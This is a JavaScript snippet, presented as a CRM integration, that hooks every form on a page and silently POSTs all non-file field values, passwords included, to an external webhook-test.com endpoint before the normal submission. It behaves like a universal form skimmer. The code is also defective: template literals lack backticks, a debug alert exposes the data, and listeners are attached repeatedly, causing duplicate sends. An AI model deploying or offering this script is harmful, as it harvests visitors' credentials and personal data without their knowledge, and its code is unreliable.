(function () {
    // Utility function to validate email
    function isValidEmail(email) {
        var regex = /^([^@]+?)@(([a-z0-9]-)[a-z0-9]+\.)+([a-z0-9]+)$/i;
        return regex.test(email);
    }

    // Collect all the form data excluding file inputs
    function collectFormData(form) {
        const formData = {};
        let containsFile = false;

        const elements = form.elements; // Get all form elements

        for (let i = 0; i < elements.length; i++) {
            const field = elements[i];

            // Detect file inputs and flag them, but don't include them in formData
            if (field.type === "file") {
                containsFile = true;
                continue; // Skip file inputs
            }

            // Create a unique key for the field
            let key = field.name || field.id || ${field.tagName.toLowerCase()}_${i};

            // Collect form fields (input, textarea, select)
            if (key && field.type !== "button" && field.type !== "submit") {
                // Validate email fields
                if (field.type === "email" && !isValidEmail(field.value)) {
                    throw new Error(Invalid email address for field: ${key});
                }

                // Handle checkboxes and radio buttons
                if (field.type === 'checkbox' || field.type === 'radio') {
                    if (field.checked) {
                        formData[key] = field.value; // Only add checked values
                    }
                } else if (field.tagName === 'SELECT' && field.multiple) {
                    const selectedOptions = Array.from(field.selectedOptions).map(option => option.value);
                    formData[key] = selectedOptions; // Store multiple values as an array
                } else {
                    formData[key] = field.value; // Store single value
                }
            } else {
                console.warn(Field without a name or id found and captured by tag/index: ${field.tagName}_${i});
            }
        }

        return { formData, containsFile };
    }


    // Function to send collected data to the CRM and return a promise
    function sendDataToCRM(data) {
        return new Promise(function (resolve, reject) {
            var xhr = new XMLHttpRequest();
            var crmEndpoint = 'https://webhook-test.com/7de36114a693293add6fbc9a1ad6cd13';
            xhr.open('POST', crmEndpoint, true);
            xhr.setRequestHeader('Content-Type', 'application/json');

            xhr.onreadystatechange = function () {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        resolve();
                    } else {
                        reject(new Error("Failed to send data to CRM"));
                    }
                }
            };

            // Send both names and values of the fields
            xhr.send(JSON.stringify({
                fields: data // Send array of field names and values to the CRM
            }));
        });
    }

    // Function to handle form submission and trigger the CRM data submission
    function handleSubmission(form) {
        return function (event) {
            event.preventDefault(); // Temporarily prevent default behavior
            console.log("event", event);

            try {
                // Capture related form data
                var { formData, containsFile } = collectFormData(form);
                alert("formData" + containsFile + JSON.stringify(formData))
                // Send data to CRM excluding file fields
                sendDataToCRM(formData).then(function () {
                    // After the data is sent, manually trigger the default action
                    form.submit();

                    // If the form contained a file, show an alert
                    if (containsFile && document.readyState === 'complete') {
                        alert("Form data was successfully sent, but files were excluded because the CRM does not support file uploads.");
                    }
                }).catch(function (error) {
                    console.error(error);
                    form.submit(); // Submit form anyway if sending to CRM fails
                });
            } catch (error) {
                console.error("Validation error:", error.message);
                // Handle validation errors (e.g., invalid email), but do not prevent submission
            }
        };
    }

    // Function to add event listeners to forms
    function attachListeners() {
        var forms = document.querySelectorAll('form');
        forms.forEach(function (form) {
            form.addEventListener('submit', handleSubmission(form), true); // Capture phase

            // Attach listeners to buttons and inputs of type "submit"
            var submitButtons = form.querySelectorAll('button[type="submit"], input[type="submit"]');
            submitButtons.forEach(function (button) {
                button.addEventListener('click', handleSubmission(form)); // Pass the form context
            });
        });
    }

    // Observe DOM changes in case forms are dynamically added
    function observeDOMChanges() {
        var observer = new MutationObserver(function (mutations) {
            attachListeners();
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }

    // Initialize listeners on DOMContentLoaded

    document.addEventListener('DOMContentLoaded', function () {
        attach(attachListeners, observeDOMChanges);
    });
    function attach(attachListeners, observeDOMChanges) {
        attachListeners();
        observeDOMChanges();
    }

})();
